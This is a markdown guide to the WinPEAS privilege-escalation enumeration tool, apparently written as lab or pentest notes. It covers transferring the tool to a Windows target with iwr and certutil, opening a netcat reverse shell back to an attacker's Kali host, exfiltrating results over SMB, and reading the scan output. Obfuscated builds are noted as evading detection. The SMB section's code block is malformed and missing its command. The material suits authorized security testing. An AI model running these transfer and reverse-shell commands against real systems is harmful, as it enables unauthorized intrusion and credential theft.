## Download & Setup

### Download from GitHub Releases

Download the appropriate binary from [Releases](https://github.com/peass-ng/PEASS-ng/releases):

| Binary | Architecture |
|--------|-------------|
| `winPEASany.exe` | Compatible across all architectures |
| `winPEASx64.exe` | 64-bit Windows |
| `winPEASx86.exe` | 32-bit legacy systems |

Both **obfuscated** and **non-obfuscated** versions are available. Obfuscated builds bypass simple signature-based detections.

### Available Formats

| Format | Description |
|--------|-------------|
| `winPEAS.exe` | Compiled binary (recommended) |
| `winPEAS.ps1` | PowerShell script — readable/modifiable source |
| `winPEAS.bat` | Batch file — signature-based checks |

## Transfer to Target

### Connect via RDP

```bash
xfreerdp /u:user /p:password321 /cert:ignore /v:10.113.190.118 /dynamic-resolution
```

### Start HTTP server on Kali

```bash
python3 -m http.server 8000
```

### Download on Windows

```cmd
powershell iwr http://192.168.131.128:8000/winPEASx64.exe -o winPEASx64.exe
```

Alternative using certutil:

```cmd
certutil -urlcache -f http://10.8.63.160:8000/winPEASx64.exe winPEAS.exe
```

### Get reverse shell (for proper ANSI color rendering)

```bash
# Kali: start listener
rlwrap -f . nc -lvnp 4444
```

```cmd
:: Windows: download nc.exe and connect back
powershell iwr http://192.168.131.128:8000/nc.exe -o nc.exe
nc.exe -e cmd.exe 192.168.131.128 4444
```

> [!TIP]
> WinPEAS colors render properly in a **Netcat reverse shell** (ANSI support). Running inside a standard RDP `cmd.exe` will show raw ASCII codes instead.

## Usage

### Help menu

```cmd
.\winPEASx64.exe --help
```

### Scan modules

| Module | Description |
|--------|-------------|
| `domain` | Domain information |
| `systeminfo` | System information |
| `eventsinfo` | Interesting events |
| `userinfo` | User information |
| `processinfo` | Processes |
| `servicesinfo` | Services |
| `applicationsinfo` | Installed applications |
| `networkinfo` | Network information |
| `networkscan` | Network scan only |
| `activedirectoryinfo` | Quick AD checks (gMSA, AD CS) |
| `cloudinfo` | Cloud information |
| `windowscreds` | Windows credentials |
| `registryinfo` | Writable HKLM/HKU keys |
| `browserinfo` | Browser information |
| `filesinfo` | Generic credential files |
| `fileanalysis` | Regex search in files (**not run by default**, slow) |
| `all` | All checks including fileanalysis |

### Key options

| Option | Description |
|--------|-------------|
| `quiet` | No banner |
| `notcolor` | Disable ANSI colors |
| `log[=file]` | Log output to file (default: `out.txt`) |
| `-lolbas` | Additional LOLBAS check |
| `-vulnpackages` | Send app versions to HackTricks for online vuln check |
| `-network="auto"` | Auto network scan |
| `wait` | Pause between checks |

## Running WinPEAS

### Run all checks and save to file (recommended)

```cmd
.\winPEASx64.exe > windows.txt
```

> [!IMPORTANT]
> **Always redirect output to a file** — this lets you analyze offline without worrying about dropped reverse shell connections.

### Run specific module only

```cmd
.\winPEASx64.exe servicesinfo
.\winPEASx64.exe windowscreds
```

## Transfer Results Back to Kali via SMB

### On Kali: start SMB server

```bash

### On Windows: copy file

copy windows.txt \\192.168.131.128\share\windows.txt
```

### On Kali: verify & read

```bash
ls    # → nc.exe  windows.txt  winPEASx64.exe

```

## Understanding WinPEAS Output

### Color Legend

| Color | Meaning |
|-------|---------|
| **Red / Red+Yellow highlight** | Misconfiguration or special privilege — **check these FIRST** |
| **Green** | Security protection enabled / well configured |
| **Cyan** | Active users |
| **Blue** | Disabled users |
| **Light Yellow** | Hyperlinks |

### Key Report Sections

**Basic System Information**

```
OS Name: Microsoft Windows Server 2019 Standard Evaluation
OS Version: 10.0.17763 N/A Build 17763
HighIntegrity: False
PartOfDomain: False
Hotfixes: KB4514366, KB4512577, KB4512578
```

**Windows Version Vulnerabilities** — cross-references installed patches against known CVEs:

```
Matched 60 known exploited vulnerabilities for this running Windows version.
CVE-2020-1472 KB4601345 [Critical] Elevation of Privilege
CVE-2021-1675 KB5003646 [Critical] Remote Code Execution
CVE-2021-34527 KB5004947 [Critical] Remote Code Execution
...
```

**Scheduled Applications (Non-Microsoft)**

```
(WIN-QBA94KB3IOF\Administrator) SaveCred: "C:\PrivEsc\savecred.bat"
Permissions folder(DLL Hijacking): Users [Allow: AppendData/CreateDirectories WriteData/CreateFiles]
Trigger: At log on of any user
```

**Other sections include**: Security controls, user tokens & privileges, service file permissions, stored credentials (registry, PuTTY, AutoAdminLogon, setup XML), DLL hijacking paths, and more.
